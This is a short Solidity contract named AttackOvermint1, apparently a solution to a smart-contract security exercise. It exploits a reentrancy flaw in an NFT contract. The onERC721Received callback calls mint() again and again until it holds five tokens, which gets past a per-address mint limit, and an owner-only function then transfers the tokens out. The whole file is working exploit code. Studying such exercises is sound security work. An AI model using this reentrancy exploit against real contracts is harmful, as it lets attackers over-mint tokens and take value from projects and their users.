// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;
import {Overmint1} from "./Overmint1.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Ownable2Step} from "@openzeppelin/contracts/access/Ownable2Step.sol";

contract AttackOvermint1 is IERC721Receiver, Ownable2Step {
    Overmint1 public nftAddress;

    constructor(address _nftAddress) {
        nftAddress = Overmint1(_nftAddress);
    }

    function attack() external onlyOwner {
        nftAddress.mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (nftAddress.balanceOf(address(this)) < 5) {
            nftAddress.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }

    function transferNFTs(uint256 tokenId) external onlyOwner {
        nftAddress.transferFrom(address(this), msg.sender, tokenId);
    }
}
